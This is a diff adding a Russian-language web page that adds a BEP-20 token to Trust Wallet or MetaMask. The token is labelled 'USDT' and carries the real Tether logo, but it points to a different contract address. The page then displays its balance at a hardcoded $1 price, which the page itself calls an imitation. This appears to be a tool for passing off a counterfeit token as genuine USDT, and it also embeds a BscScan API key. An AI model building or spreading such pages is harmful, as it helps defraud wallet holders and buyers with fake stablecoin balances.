@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Добавить токен BEP-20 в кошелек</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: #0A0C22;
+            color: white;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+        }
+        .wallet-container {
+            max-width: 600px;
+            margin: 20px auto;
+            background: #151A38;
+            border-radius: 10px;
+            padding: 20px;
+        }
+        .coin-row {
+            display: flex;
+            align-items: center;
+            padding: 15px 0;
+            border-bottom: 1px solid #2A2F5B;
+        }
+        .coin-logo {
+            width: 40px;
+            height: 40px;
+            margin-right: 15px;
+        }
+        .coin-info {
+            flex-grow: 1;
+        }
+        .coin-name {
+            font-weight: bold;
+            margin: 0;
+        }
+        .coin-amount {
+            color: #A1A6C5;
+            margin: 5px 0 0 0;
+        }
+        .coin-value {
+            text-align: right;
+            color: #00CC66;
+        }
+        .total-balance {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            color: #FFFFFF;
+        }
+        .button {
+            padding: 10px 20px;
+            background: #3375BB;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px 0;
+            width: 100%;
+        }
+        .button:hover {
+            background: #285e99;
+        }
+    </style>
+</head>
+<body>
+    <h1>Добавить токен BEP-20</h1>
+    <p>Для Trust Wallet и MetaMask (Binance Smart Chain)</p>
+    <button class="button" onclick="switchToBSCAndAddToken()">Добавить токен в кошелек</button>
+
+    <div class="wallet-container">
+        <p>Имитация с ценой $1 (подключите кошелек)</p>
+        <button class="button" onclick="fetchTokenBalance()">Обновить баланс</button>
+        <div id="coinList"></div>
+        <div class="total-balance" id="totalBalance">$0.00</div>
+    </div>
+
+    <script>
+        const tokenData = {
+            address: "0x61121f6c9ee92845F4946Bc3f55212828F009387", // Ваш токен BEP-20
+            symbol: "USDT",
+            decimals: 18,
+            image: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x55d398326f99059fF775485246999027B3197955/logo.png", // Логотип USDT
+            price: 1 // Для имитации
+        };
+
+        const bscChainId = "0x38"; // Chain ID для BSC Mainnet
+        let walletData = JSON.parse(localStorage.getItem('walletData')) || {
+            tokenAmount: 0,
+            totalBalance: 0
+        };
+
+        // Переключение на BSC и добавление токена
+        async function switchToBSCAndAddToken() {
+            if (typeof window.ethereum === 'undefined') {
+                alert('Откройте эту страницу в Trust Wallet (Browser) или MetaMask.');
+                return;
+            }
+
+            const provider = window.ethereum;
+
+            try {
+                // Переключаем сеть на BSC
+                const currentChainId = await provider.request({ method: 'eth_chainId' });
+                if (currentChainId !== bscChainId) {
+                    await provider.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: bscChainId }],
+                    });
+                    alert('Сеть переключена на Binance Smart Chain.');
+                }
+
+                // Добавляем токен
+                const wasAdded = await provider.request({
+                    method: 'wallet_watchAsset',
+                    params: {
+                        type: 'ERC20', // BEP-20 распознается через сеть BSC
+                        options: {
+                            address: tokenData.address,
+                            symbol: tokenData.symbol,
+                            decimals: tokenData.decimals,
+                            image: tokenData.image
+                        }
+                    }
+                });
+
+                if (wasAdded) {
+                    alert('Токен BEP-20 добавлен в ваш кошелек!');
+                    localStorage.setItem('tokenAdded', JSON.stringify(tokenData));
+                } else {
+                    alert('Вы отклонили добавление токена.');
+                }
+            } catch (error) {
+                console.error('Ошибка:', error);
+                if (error.message && error.message.includes('existent asset')) {
+                    alert('Токен уже добавлен. Удалите его вручную, если нужно обновить логотип.');
+                } else if (error.code === 4902) {
+                    await provider.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [{
+                            chainId: bscChainId,
+                            chainName: 'Binance Smart Chain',
+                            nativeCurrency: {
+                                name: 'BNB',
+                                symbol: 'BNB',
+                                decimals: 18
+                            },
+                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                            blockExplorerUrls: ['https://bscscan.com']
+                        }]
+                    });
+                    alert('Сеть BSC добавлена. Попробуйте снова.');
+                } else {
+                    alert('Ошибка: ' + error.message);
+                }
+            }
+        }
+
+        // Получение баланса подключенного кошелька
+        async function fetchTokenBalance() {
+            if (typeof window.ethereum === 'undefined') {
+                alert('Подключите кошелек (Trust Wallet или MetaMask).');
+                return;
+            }
+
+            const provider = window.ethereum;
+
+            try {
+                // Запрашиваем адрес подключенного кошелька
+                const accounts = await provider.request({ method: 'eth_requestAccounts' });
+                const walletAddress = accounts[0];
+
+                // Проверяем сеть
+                const currentChainId = await provider.request({ method: 'eth_chainId' });
+                if (currentChainId !== bscChainId) {
+                    alert('Переключитесь на Binance Smart Chain в кошельке.');
+                    return;
+                }
+
+                // Получаем баланс через BscScan
+                const response = await fetch(
+                    `https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=${tokenData.address}&address=${walletAddress}&tag=latest&apikey=A567ESIJMVGJAJM3ICSMR3VCETS1I915NF`
+                );
+                const data = await response.json();
+
+                if (data.status === "1") {
+                    walletData.tokenAmount = parseInt(data.result) / Math.pow(10, tokenData.decimals);
+                    updateWallet();
+                } else {
+                    alert('Ошибка при получении баланса: ' + data.message);
+                }
+            } catch (error) {
+                console.error('Ошибка:', error);
+                alert('Не удалось загрузить баланс. Используются сохраненные данные.');
+                updateWallet();
+            }
+        }
+
+        // Обновление имитации
+        function updateWallet() {
+            const coinList = document.getElementById('coinList');
+            const tokenValue = walletData.tokenAmount * tokenData.price;
+            walletData.totalBalance = tokenValue;
+            
+            coinList.innerHTML = `
+                <div class="coin-row">
+                    <img src="${tokenData.image}" class="coin-logo" alt="${tokenData.symbol}">
+                    <div class="coin-info">
+                        <p class="coin-name">${tokenData.symbol}</p>
+                        <p class="coin-amount">${walletData.tokenAmount.toFixed(6)} ${tokenData.symbol}</p>
+                    </div>
+                    <div class="coin-value">
+                        $${tokenValue.toFixed(2)}
+                        <br>
+                        <small>1 ${tokenData.symbol} = $${tokenData.price.toFixed(2)}</small>
+                    </div>
+                </div>
+            `;
+
+            document.getElementById('totalBalance').textContent = 
+                `Общий баланс: $${walletData.totalBalance.toFixed(2)}`;
+            
+            localStorage.setItem('walletData', JSON.stringify(walletData));
+        }
+
+        updateWallet();
+    </script>
+</body>
+</html>
